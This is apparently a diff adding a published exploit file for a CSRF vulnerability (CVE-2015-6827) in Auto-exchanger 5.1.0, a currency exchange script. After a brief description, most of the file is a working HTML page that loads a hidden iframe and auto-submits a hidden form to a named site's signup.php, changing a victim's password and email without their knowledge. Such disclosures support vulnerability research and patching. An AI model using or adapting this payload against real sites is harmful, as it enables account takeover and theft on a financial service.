@@ -1,0 +1,60 @@
+<!--
+# Exploit Title: [Auto-exchanger version 5.1.0 Xsrf]
+# Date: [2015/06/05]
+# Exploit Author: [Aryan Bayaninejad]
+# Linkedin : [https://www.linkedin.com/profile/view?id=276969082]
+# Vendor Homepage: [www.auto-exchanger.com]
+# Version: [Version 5.1.0]
+# Demo : www.farhadexchange.com
+# CVE : [CVE-2015-6827]
+
+------------------------------------
+details:
+------------------------------------
+
+auto-exchanger version 5.1.0 suffers from an xsrf vulnerability , attacker
+is able to abuse of this vulnerability to change password by a hidden
+iframe in another page.
+
+-------------------------------------
+
+Exploit:
+
+-------------------------------------
+-->
+
+<html>
+<body>
+<iframe style="display:none" name="xsrf-frame"></iframe>
+<form method='POST' action='http://farhadexchange.com/signup.php'
+target="xsrf-frame" id="xsrf-form">
+
+<label id="lbl_error" name="lbl_error" class="ErrorMessage"></label>
+<INPUT type="hidden" name="suser" value="victim_user">
+<input type="hidden" name="section" value="do_update" />
+<label type='hidden' id="n_password0"><span>
+<input type='hidden' maxlength="20" size="30" name="password0"
+id="password0"   value="testpassword123456" >  </label>
+<input type="hidden" name="rid" value="" />
+<label id="n_password">
+<input type="hidden" maxlength="20" size="30" name="password1"
+id="password1"   value="testpassword123456"   ></label>
+<label id="n_mail">
+<INPUT type='hidden' maxLength=60 size=30 name="mail" id="mail"
+value="victim_email" type="text">
+</label>
+<label id="n_country">
+<input type='hidden'  name="country" id="country"  style="width:196;"
+value="IR">
+</label>
+<label id="cid">
+<input type='hidden' name='cid' value='2'/>
+</label>
+<label id="n_curreny_account">
+<INPUT type='hidden' maxLength=60 size=30 name="curreny_account"
+id="curreny_account" value="" ><br>
+</label>
+</form>
+<script>document.getElementById("xsrf-form").submit()</script>
+</body>
+</html>
